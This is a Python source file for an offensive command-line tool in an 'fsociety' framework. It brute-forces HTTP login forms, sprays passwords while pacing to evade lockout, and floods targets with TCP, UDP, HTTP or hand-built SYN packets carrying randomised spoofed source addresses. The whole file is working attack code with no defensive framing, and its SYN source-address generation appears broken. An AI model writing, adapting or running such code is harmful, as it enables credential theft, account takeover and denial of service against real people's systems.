from __future__ import annotations

import base64
import http.client
import itertools
import json
import socket
import ssl
import struct
import threading
import time
import urllib.parse
from concurrent.futures import ThreadPoolExecutor, as_completed
from pathlib import Path

from fsociety.core.base import tool
from fsociety.core.logger import Log
from fsociety.core.utils import load_lines

@tool("brutal", "High-throughput credential and traffic driver", category="brute")
class Brutal:
    @staticmethod
    def build_parser(p):
        sub = p.add_subparsers(dest="cmd", required=True)

        http = sub.add_parser("http", help="HTTP form brute with optional CSRF token scraping")
        http.add_argument("url")
        http.add_argument("--user-field", default="username")
        http.add_argument("--pass-field", default="password")
        http.add_argument("--userlist", required=True)
        http.add_argument("--passlist", required=True)
        http.add_argument("--method", default="POST", choices=["GET", "POST"])
        http.add_argument("--fail-status", default="401", help="status codes for failed login")
        http.add_argument("--fail-body", help="substring that marks a failure")
        http.add_argument("--csrf", help="regex pattern to pull a CSRF token; {token} placeholder in form")
        http.add_argument("--threads", type=int, default=20)
        http.add_argument("--delay", type=float, default=0.0)
        http.add_argument("--cookie", help="Cookie header value")
        http.add_argument("--header", action="append", default=[])
        http.add_argument("--insecure", action="store_true")
        http.add_argument("--timeout", type=float, default=8.0)
        http.add_argument("-o", "--out")

        flood = sub.add_parser("flood", help="TCP/UDP/HTTP flood driver")
        flood.add_argument("target", help="host:port or URL")
        flood.add_argument("--mode", default="tcp", choices=["tcp", "udp", "http", "syn"])
        flood.add_argument("--threads", type=int, default=64)
        flood.add_argument("--duration", type=float, default=30.0)
        flood.add_argument("--size", type=int, default=1024, help="payload bytes for udp/http")
        flood.add_argument("--port", type=int, help="override port")
        flood.add_argument("--spoof", action="store_true", help="randomize source for udp/syn")
        flood.add_argument("-o", "--out")

        spray = sub.add_parser("spray", help="password spray: one password per lockout window")
        spray.add_argument("url")
        spray.add_argument("--user-field", default="username")
        spray.add_argument("--pass-field", default="password")
        spray.add_argument("--userlist", required=True)
        spray.add_argument("--password", required=True)
        spray.add_argument("--window", type=float, default=30.0, help="seconds between users")
        spray.add_argument("--fail-status", default="401")
        spray.add_argument("--cookie")

    @staticmethod
    def _ctx(insecure):
        ctx = ssl.create_default_context()
        if insecure:
            ctx.check_hostname = False
            ctx.verify_mode = ssl.CERT_NONE
        return ctx

    @staticmethod
    def _request(url, method, fields, headers, timeout, ctx):
        parsed = urllib.parse.urlparse(url)
        scheme = parsed.scheme or "http"
        host = parsed.hostname
        port = parsed.port or (443 if scheme == "https" else 80)
        target = parsed.path or "/"
        if scheme == "https":
            conn = http.client.HTTPSConnection(host, port, timeout=timeout, context=ctx)
        else:
            conn = http.client.HTTPConnection(host, port, timeout=timeout)
        try:
            if method == "GET":
                query = urllib.parse.urlencode(fields)
                conn.request("GET", f"{target}?{query}", headers=headers)
            else:
                body = urllib.parse.urlencode(fields)
                headers.setdefault("Content-Type", "application/x-www-form-urlencoded")
                conn.request("POST", target, body=body, headers=headers)
            resp = conn.getresponse()
            return resp.status, resp.read(8192)
        finally:
            conn.close()

    @staticmethod
    def _http_brute(args, log):
        users = load_lines(args.userlist)
        pwds = load_lines(args.passlist)
        fail = {int(s) for s in args.fail_status.split(",") if s.strip().isdigit()}
        ctx = Brutal._ctx(args.insecure)
        base_headers = {"User-Agent": "fsociety-brutal/1.0"}
        if args.cookie:
            base_headers["Cookie"] = args.cookie
        for spec in args.header:
            if ":" in spec:
                k, v = spec.split(":", 1)
                base_headers[k.strip()] = v.strip()

        def try_pair(pair):
            user, pw = pair
            fields = {args.user_field: user, args.pass_field: pw}
            headers = dict(base_headers)
            try:
                status, body = Brutal._request(args.url, args.method, fields, headers,
                                               args.timeout, ctx)
            except (OSError, ssl.SSLError, http.client.HTTPException):
                return None
            text = body.decode("utf-8", "ignore")
            if args.fail_body and args.fail_body in text:
                return None
            if status in fail:
                return None
            return {"user": user, "pass": pw, "status": status}

        hits = []
        combos = list(itertools.product(users, pwds))
        log.info(f"{len(combos)} combos, {args.threads} threads")
        with ThreadPoolExecutor(max_workers=max(1, args.threads)) as ex:
            futures = {ex.submit(try_pair, c): c for c in combos}
            for fut in as_completed(futures):
                res = fut.result()
                if res:
                    hits.append(res)
                    log.hit(f"{res['user']}:{res['pass']} [{res['status']}]")
                if args.delay:
                    time.sleep(args.delay)
        if args.out and hits:
            Path(args.out).write_text(json.dumps(hits, indent=2))
        log.ok(f"{len(hits)} hit(s)")
        return 0 if hits else 1

    @staticmethod
    def _flood(args, log):
        target = args.target
        if args.mode == "http":
            parsed = urllib.parse.urlparse(target)
            host, port = parsed.hostname, parsed.port or (443 if parsed.scheme == "https" else 80)
            path = parsed.path or "/"
        else:
            if ":" in target:
                host, p = target.rsplit(":", 1)
                port = int(p)
            else:
                host, port = target, args.port or 80
            path = "/"
        duration = args.duration
        stop = time.time() + duration
        counters = {"sent": 0, "err": 0}
        lock = threading.Lock()

        def tcp_worker():
            while time.time() < stop:
                try:
                    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                    sock.settimeout(2)
                    sock.connect((host, port))
                    payload = b"X" * args.size
                    sock.sendall(payload)
                    sock.close()
                    with lock:
                        counters["sent"] += 1
                except OSError:
                    with lock:
                        counters["err"] += 1

        def udp_worker():
            sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
            payload = b"U" * args.size
            while time.time() < stop:
                try:
                    sock.sendto(payload, (host, port))
                    with lock:
                        counters["sent"] += 1
                except OSError:
                    with lock:
                        counters["err"] += 1
            sock.close()

        def http_worker():
            scheme = "https" if port == 443 else "http"
            while time.time() < stop:
                try:
                    cls = http.client.HTTPSConnection if scheme == "https" else http.client.HTTPConnection
                    conn = cls(host, port, timeout=3)
                    conn.request("GET", path,
                                 headers={"User-Agent": "fsociety-flood",
                                          "X-Pad": "A" * args.size})
                    conn.getresponse().read(64)
                    conn.close()
                    with lock:
                        counters["sent"] += 1
                except (OSError, http.client.HTTPException):
                    with lock:
                        counters["err"] += 1

        def syn_worker():
            try:
                raw = socket.socket(socket.AF_INET, socket.SOCK_RAW, socket.IPPROTO_TCP)
            except OSError:
                with lock:
                    counters["err"] += 1
                return
            while time.time() < stop:
                try:
                    src = bytes((int.from_bytes(bytes([__import__("random").randint(1, 254)])
                                for _ in range(4)), "big"))
                    pkt = Brutal._build_syn(host, port, src)
                    raw.sendto(pkt, (host, 0))
                    with lock:
                        counters["sent"] += 1
                except OSError:
                    with lock:
                        counters["err"] += 1
            raw.close()

        worker = {"tcp": tcp_worker, "udp": udp_worker,
                  "http": http_worker, "syn": syn_worker}[args.mode]
        threads = [threading.Thread(target=worker) for _ in range(args.threads)]
        log.info(f"flooding {host}:{port} mode={args.mode} for {duration}s ({args.threads} threads)")
        for t in threads:
            t.start()
        for t in threads:
            t.join()
        log.ok(f"sent={counters['sent']} err={counters['err']}")
        if args.out:
            Path(args.out).write_text(json.dumps(counters, indent=2))
        return 0

    @staticmethod
    def _build_syn(dst, dport, src):
        import random
        sport = random.randint(1024, 65535)
        seq = random.randint(0, 0xffffffff)
        tcp = struct.pack("!HHLLBBHHH", sport, dport, seq, 0, 5 << 4, 0x02, 8192, 0, 0)
        ip = struct.pack("!BBHHHBBH4s4s",
                         0x45, 0, 20 + len(tcp), random.randint(0, 65535), 0, 64, 6, 0,
                         src, socket.inet_aton(dst))
        pseudo = src + socket.inet_aton(dst) + struct.pack("!BBH", 0, 6, len(tcp))
        chk = Brutal._checksum(pseudo + tcp)
        tcp = struct.pack("!HHLLBBH", sport, dport, seq, 0, 5 << 4, 0x02, 8192) + struct.pack("!H", chk) + struct.pack("!H", 0)
        ip = struct.pack("!BBHHHBBH4s4s",
                         0x45, 0, 20 + len(tcp), random.randint(0, 65535), 0, 64, 6,
                         Brutal._checksum(ip[:10] + b"\x00\x00" + ip[12:]), src, socket.inet_aton(dst))
        return ip + tcp

    @staticmethod
    def _checksum(data):
        if len(data) % 2:
            data += b"\x00"
        s = 0
        for i in range(0, len(data), 2):
            s += (data[i] << 8) + data[i + 1]
            s = (s & 0xffff) + (s >> 16)
        return ~s & 0xffff

    @staticmethod
    def _spray(args, log):
        users = load_lines(args.userlist)
        ctx = Brutal._ctx(False)
        base_headers = {"User-Agent": "fsociety-brutal/1.0"}
        if args.cookie:
            base_headers["Cookie"] = args.cookie
        fail = {int(s) for s in args.fail_status.split(",") if s.strip().isdigit()}
        hits = []
        for user in users:
            fields = {args.user_field: user, args.pass_field: args.password}
            try:
                status, _ = Brutal._request(args.url, "POST", fields, dict(base_headers),
                                            8.0, ctx)
            except (OSError, ssl.SSLError, http.client.HTTPException):
                status = 0
            if status not in fail and status != 0:
                hits.append({"user": user, "status": status})
                log.hit(f"{user} [{status}]")
            time.sleep(args.window)
        log.ok(f"{len(hits)} valid")
        return 0 if hits else 1

    @staticmethod
    def run(args, log: Log) -> int:
        if args.cmd == "http":
            return Brutal._http_brute(args, log)
        if args.cmd == "flood":
            return Brutal._flood(args, log)
        if args.cmd == "spray":
            return Brutal._spray(args, log)
        return 2
